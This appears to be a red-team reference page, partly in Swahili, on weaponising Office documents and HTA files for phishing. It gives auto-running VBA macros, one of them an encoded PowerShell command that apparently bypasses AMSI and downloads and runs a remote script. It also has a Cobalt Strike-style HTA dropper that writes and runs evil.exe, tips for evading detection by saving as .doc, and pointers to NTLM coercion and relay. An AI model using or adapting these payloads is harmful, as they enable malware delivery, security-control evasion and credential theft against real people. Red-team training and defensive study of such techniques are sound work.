# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word hufanya uthibitisho wa data za faili kabla ya kufungua faili. Uthibitisho wa data hufanywa kwa njia ya utambuzi wa muundo wa data, dhidi ya kiwango cha OfficeOpenXML. Ikiwa kosa lolote litajitokeza wakati wa utambuzi wa muundo wa data, faili inayochambuliwa haitafunguliwa.

Kwa kawaida, faili za Word zinazokuwa na macros hutumia kiendelezi cha `.docm`. Hata hivyo, inawezekana kubadilisha jina la faili kwa kubadilisha kiendelezi cha faili na bado kuhifadhi uwezo wao wa kutekeleza macros.\
Kwa mfano, faili ya RTF haisaidii macros, kwa muundo, lakini faili ya DOCM iliyobadilishwa kuwa RTF itashughulikiwa na Microsoft Word na itakuwa na uwezo wa kutekeleza macros.\
Mifumo na mitambo sawa inatumika kwa programu zote za Microsoft Office Suite (Excel, PowerPoint n.k.).

Unaweza kutumia amri ifuatayo kuangalia ni viendelezi gani vitakavyotekelezwa na baadhi ya programu za Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### External Image Load

Go to: _Insert --> Quick Parts --> Field_\
&#xNAN;_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://\<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Ni rahisi kutumia macros kuendesha msimbo wa kawaida kutoka kwenye hati.

#### Autoload functions

Kadri zinavyokuwa za kawaida, ndivyo uwezekano wa AV kuzitambua unavyoongezeka.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ondoa metadata kwa mikono

Nenda kwenye **File > Info > Inspect Document > Inspect Document**, ambayo itafungua Document Inspector. Bonyeza **Inspect** kisha **Remove All** kando ya **Document Properties and Personal Information**.

#### Upanuzi wa Doc

Unapomaliza, chagua **Save as type** dropdown, badilisha muundo kutoka **`.docx`** hadi **Word 97-2003 `.doc`**.\
Fanya hivi kwa sababu huwezi **kuhifadhi macro ndani ya `.docx`** na kuna **stigma** **kuhusu** upanuzi wa macro-enabled **`.docm`** (kwa mfano, ikoni ya thumbnail ina `!` kubwa na baadhi ya lango la wavuti/barua pepe yanayazuia kabisa). Hivyo, upanuzi huu wa zamani wa **`.doc`** ni suluhisho bora.

#### Watengenezaji wa Macros Mbaya

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Faili za HTA

HTA ni programu ya Windows ambayo **inaunganisha HTML na lugha za skripti (kama VBScript na JScript)**. Inaunda kiolesura cha mtumiaji na inatekelezwa kama programu "iliyokubaliwa kikamilifu", bila vizuizi vya mfano wa usalama wa kivinjari.

HTA inatekelezwa kwa kutumia **`mshta.exe`**, ambayo kwa kawaida **imewekwa** pamoja na **Internet Explorer**, ikifanya **`mshta` kuwa tegemezi kwa IE**. Hivyo ikiwa imeondolewa, HTAs hazitaweza kutekelezwa.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Kulazimisha Uthibitisho wa NTLM

Kuna njia kadhaa za **kulazimisha uthibitisho wa NTLM "kijijini"**, kwa mfano, unaweza kuongeza **picha zisizoonekana** kwenye barua pepe au HTML ambazo mtumiaji atafikia (hata HTTP MitM?). Au tuma mwathirika **anwani ya faili** ambazo zita **anzisha** **uthibitisho** tu kwa **kufungua folda.**

**Angalia mawazo haya na mengine kwenye kurasa zifuatazo:**

{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Usisahau kwamba huwezi tu kuiba hash au uthibitisho bali pia **fanya mashambulizi ya NTLM relay**:

- [**Mashambulizi ya NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay kwa vyeti)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

{{#include ../../banners/hacktricks-training.md}}
